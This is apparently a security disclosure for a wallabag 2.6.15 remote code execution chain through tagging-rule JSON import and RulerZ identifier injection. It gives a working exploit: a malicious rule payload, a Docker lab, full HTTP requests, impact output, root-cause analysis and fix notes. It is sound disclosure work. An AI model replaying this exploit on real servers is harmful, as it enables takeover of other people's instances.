### Vulnerability details

**Official website / Product:** https://www.wallabag.org / https://github.com/wallabag/wallabag

**Repository:** wallabag/wallabag (stars at selection: 13000)

**Vulnerability type:** RCE / getshell (tagging-rule JSON import ValidRule bypass → RulerZ NativeVisitor identifier injection → PHP backtick shell)

**Vulnerability versions:** 2.6.15 (Docker image `wallabag/wallabag:2.6.15`; audited source tag `2.6.15` / commit `9fd354dc162c9a5afc047699cef851d2a6c80cee`). RulerZ via `kphoen/rulerz` **0.21.1** (lock ref `d28a1bd59b4e66cc9fcdeee965f13f685eb9ce41`) Native target `visitAccess` + `Grammar.pp` identifier token.

**Vulnerability URL / Parameter:** `POST /config` multipart field `upload_tagging_rule_file[file]` (JSON array of `{"rule","tags"}`). Trigger: `POST /new-entry` (any URL) → `ContentProxy` → `RuleBasedTagger::tag` → `RulerZ::satisfies`. Malicious rule shape: `x"&&`id>/tmp/wb-rce`&&" matches "z"`. Sample JSON:

```json
[
  {
    "rule": "x\"&&`id>/tmp/wb-rce`&&\" matches \"z\"",
    "tags": [
      "pwned"
    ]
  }
]
```

**Complex:** yes

### Verification procedure

1. Start with the `docker-compose.yml` below (host port **19110→80**, image `wallabag/wallabag:2.6.15` + `redis:7-alpine`, `pdo_sqlite`, `POPULATE_DATABASE=True`; containers `wallabag-r11a10` / `wallabag-r11a10-redis`). Save as `docker-compose.yml` and run `docker compose up -d`:

```yaml
services:
  wallabag:
    image: wallabag/wallabag:2.6.15
    container_name: wallabag-r11a10
    restart: unless-stopped
    ports:
      - "19110:80"
    environment:
      - SYMFONY__ENV__DATABASE_DRIVER=pdo_sqlite
      - SYMFONY__ENV__DATABASE_PATH=/var/www/wallabag/data/db/wallabag.sqlite
      - SYMFONY__ENV__DOMAIN_NAME=http://127.0.0.1:19110
      - SYMFONY__ENV__FOSUSER_REGISTRATION=true
      - SYMFONY__ENV__FOSUSER_CONFIRMATION=false
      - SYMFONY__ENV__REDIS_HOST=redis
      - POPULATE_DATABASE=True
    volumes:
      - wallabag_images:/var/www/wallabag/web/assets/images
      - wallabag_data:/var/www/wallabag/data
    depends_on:
      - redis
  redis:
    image: redis:7-alpine
    container_name: wallabag-r11a10-redis
    restart: unless-stopped

volumes:
  wallabag_images:
  wallabag_data:
```

2. Open http://127.0.0.1:19110/ and log in with default **`wallabag` / `wallabag`**; keep the `PHPSESSID` cookie.
3. `GET /config` and extract CSRF `upload_tagging_rule_file[_token]` from the tagging-rule import form. `GET /new-entry` and extract `entry[_token]`. Tokens are per-session (PoC values below are from one measured session and must be refreshed):

```
SESS=4t7fhcdrku0o1ulkb5rh61rff8
IMPORT_TOKEN=tRXJQb5g6KGUgRBK9T5lLTTXRp0mpvZ9dytHIODCLCo
ENTRY_TOKEN=naT7hKTw5SGxgekJh-FfV5i0ucsIXnPfUmqbdm5_O9s
```

4. `POST /config` multipart-upload a JSON tagging-rule file whose `rule` embeds RulerZ identifier injection with PHP backticks (UI form path applies `@RulerZAssert\ValidRule`; **import path does not**). Upload the malicious JSON shown in the vulnerability details (any filename, e.g. `evil_rules.json`).
5. `POST /new-entry` with any URL. Saving the entry runs `ContentProxy::stockEntry` → `RuleBasedTagger::tag` → RulerZ compiles/loads executor and evaluates `satisfies`, executing the backtick payload as the PHP-FPM user (`nobody`).
6. `docker exec wallabag-r11a10 cat /tmp/wb-rce` shows `uid=65534(nobody)`.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified). `PHPSESSID` / CSRF values are from one measured session; refresh them per verification steps 2–3 when replaying:

```http
# --- Step A: import malicious tagging-rule JSON (bypasses ValidRule) ---
POST /config HTTP/1.1
Host: 127.0.0.1:19110
User-Agent: wallabag-r11a10-poc
Accept: text/html,application/xhtml+xml
Cookie: PHPSESSID=4t7fhcdrku0o1ulkb5rh61rff8
Content-Type: multipart/form-data; boundary=------------------------r11a10pocboundary02
Content-Length: 622
Connection: close

--------------------------r11a10pocboundary02
Content-Disposition: form-data; name="upload_tagging_rule_file[file]"; filename="evil_rules.json"
Content-Type: application/json

[
  {
    "rule": "x\"&&`id>/tmp/wb-rce`&&\" matches \"z\"",
    "tags": [
      "pwned"
    ]
  }
]
--------------------------r11a10pocboundary02
Content-Disposition: form-data; name="upload_tagging_rule_file[import]"


--------------------------r11a10pocboundary02
Content-Disposition: form-data; name="upload_tagging_rule_file[_token]"

tRXJQb5g6KGUgRBK9T5lLTTXRp0mpvZ9dytHIODCLCo
--------------------------r11a10pocboundary02--

# --- Step B: create entry to trigger RuleBasedTagger / RulerZ satisfies ---
POST /new-entry HTTP/1.1
Host: 127.0.0.1:19110
User-Agent: wallabag-r11a10-poc
Accept: text/html,application/xhtml+xml
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=4t7fhcdrku0o1ulkb5rh61rff8
Content-Length: 123
Connection: close

entry%5Burl%5D=http%3A%2F%2Fexample.com%2Fr11a10-final-verify&entry%5B_token%5D=naT7hKTw5SGxgekJh-FfV5i0ucsIXnPfUmqbdm5_O9s

```

Complete HTTP response (raw Docker-lab response):

```http
# --- Step A response ---
HTTP/1.1 302 Found
Server: nginx
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.2.35
Cache-Control: max-age=0, must-revalidate, private
Date: Sun, 01 Nov 2026 14:20:53 GMT
Location: /config#set5
Expires: Sun, 01 Nov 2026 14:20:53 GMT

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='/config#set5'" />

        <title>Redirecting to /config#set5</title>
    </head>
    <body>
        Redirecting to <a href="/config#set5">/config#set5</a>.
    </body>
</html>
# --- Step B response ---
HTTP/1.1 302 Found
Server: nginx
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.2.35
Cache-Control: max-age=0, must-revalidate, private
Date: Sun, 01 Nov 2026 14:20:54 GMT
Location: /
Expires: Sun, 01 Nov 2026 14:20:54 GMT

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='/'" />

        <title>Redirecting to /</title>
    </head>
    <body>
        Redirecting to <a href="/">/</a>.
    </body>
</html>
# --- Impact proof (docker exec wallabag-r11a10 cat /tmp/wb-rce) ---
-rw-r--r--    1 nobody   nobody          57 Nov  1 14:20 /tmp/wb-rce
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)

COMPILED
<?php
namespace RulerZ\Compiled\Executor;

use RulerZ\Executor\Executor;

class Executor_6a74a9e9 implements Executor
{
    	use \RulerZ\Executor\ArrayTarget\FilterTrait;
	use \RulerZ\Executor\ArrayTarget\SatisfiesTrait;
	use \RulerZ\Executor\ArrayTarget\ArgumentUnwrappingTrait;

    

    // x"&&`id>/tmp/wb-rce`&&" matches "z"
    protected function execute($target, array $operators, array $parameters)
    {
        return call_user_func($operators["matches"], $this->unwrapArgument($target["x"&&`id>/tmp/wb-rce`&&""]), 'z');
    }
}
```

Verification result notes:

- Step A returns HTTP 302 to `/config#set5`; config page lists the imported rule and tag `pwned`.
- Step B returns HTTP 302 to `/`. App log may record a follow-on PropertyAccess error on empty key `""` after the backtick expression runs; RCE already completed.
- `/tmp/wb-rce` contains `uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)`.
- Compiled executor at `var/cache/prod/rulerz/rulerz_executor_6a74a9e9` contains `$target["x"&&`id>/tmp/wb-rce`&&""]`.

### Vulnerability analysis

Two bugs chain into RCE:

1. **ValidRule bypass on import** — `ConfigController` tagging-rule import decodes JSON and `persist`s `TaggingRule` without validating the entity's `@RulerZAssert\ValidRule(allowed_variables=..., allowed_operators=...)`. The interactive form path validates; import does not.

2. **Unsafe RulerZ Native code generation** — `NativeVisitor::visitAccess` emits `sprintf('["%s"]', $element->getId())`. RulerZ `Grammar.pp` defines `identifier` as `[^\s\(\)\[\],\.]+`, so `"`, backticks, and `&` are legal inside identifiers. A crafted id closes the generated string early and injects PHP, e.g. `$target["x"&&`id>/tmp/wb-rce`&&""]`. FileEvaluator writes the executor under `var/cache/*/rulerz/` and `require`s it; `satisfies()` runs `execute()` and the backticks spawn a shell.

`ContentProxy` catches exceptions from `tag()` so the entry still saves; impact is silent RCE on every new/updated entry while the malicious rule remains.

### Trigger / sink source (full path and line numbers)

```php
# File: src/Wallabag/CoreBundle/Controller/ConfigController.php
# Lines: 175-203 (tagging rules import; no ValidRule / validator->validate)
// handle tagging rules import
$taggingRulesImportform = $this->createForm(TaggingRuleImportType::class);
$taggingRulesImportform->handleRequest($request);

if ($taggingRulesImportform->isSubmitted() && $taggingRulesImportform->isValid()) {
    $message = 'flashes.config.notice.tagging_rules_not_imported';
    $file = $taggingRulesImportform->get('file')->getData();

    if (null !== $file && $file->isValid() && \in_array($file->getClientMimeType(), ['application/json', 'application/octet-stream'], true)) {
        $content = json_decode(file_get_contents($file->getPathname()), true);

        if (\is_array($content)) {
            foreach ($content as $rule) {
                $taggingRule = new TaggingRule();
                $taggingRule->setRule($rule['rule']);  // unsanitized
                $taggingRule->setTags($rule['tags']);
                $taggingRule->setConfig($config);
                $this->entityManager->persist($taggingRule);
            }

            $this->entityManager->flush();

            $message = 'flashes.config.notice.tagging_rules_imported';
        }
    }

    $this->addFlash('notice', $message);

    return $this->redirect($this->generateUrl('config') . '#set5');
}
```

```php
# File: vendor/kphoen/rulerz/src/Target/Native/NativeVisitor.php (kphoen/rulerz 0.21.1)
# Lines: 17-28 (visitAccess)
public function visitAccess(AST\Bag\Context $element, &$handle = null, $eldnah = null)
{
    $flattenedDimensions = [
        sprintf('["%s"]', $element->getId()),  // identifier interpolated raw
    ];

    foreach ($element->getDimensions() as $dimension) {
        $flattenedDimensions[] = sprintf('["%s"]', $dimension[AST\Bag\Context::ACCESS_VALUE]);
    }

    return sprintf('$this->unwrapArgument($target%s)', implode('', $flattenedDimensions));
}
```

```php
# File: vendor/kphoen/rulerz/src/Grammar.pp (kphoen/rulerz 0.21.1)
# Line: 70 (Token: identifier)
%token  identifier    [^\s\(\)\[\],\.]+
```

```php
# File: src/Wallabag/CoreBundle/Helper/ContentProxy.php
# Lines: 331-338 (auto-tag inside stockEntry)
try {
    $this->tagger->tag($entry);
} catch (\Exception $e) {
    $this->logger->error('Error while trying to automatically tag an entry.', [
        'entry_url' => $content['url'],
        'error_msg' => $e->getMessage(),
    ]);
}
```

```php
# File: src/Wallabag/CoreBundle/Helper/RuleBasedTagger.php
# Lines: 34-42 (tag → rulerz->satisfies)
public function tag(Entry $entry)
{
    $rules = $this->getRulesForUser($entry->getUser());

    $clonedEntry = $this->fixEntry($entry);

    foreach ($rules as $rule) {
        if (!$this->rulerz->satisfies($clonedEntry, $rule->getRule())) {
            continue;
        }
```

### Fix notes

1. Run the same `ValidRule` (or `$validator->validate($taggingRule)`) on every imported rule before persist; reject on violation.
2. Harden RulerZ NativeVisitor: only allow `[A-Za-z_][A-Za-z0-9_]*` identifiers, or emit `var_export($id, true)` inside the key expression.
3. Prefer disallowing backtick operators in compiled executors (disable shell execution in PHP if feasible for the pool).
4. Optionally re-validate all stored tagging rules on upgrade.
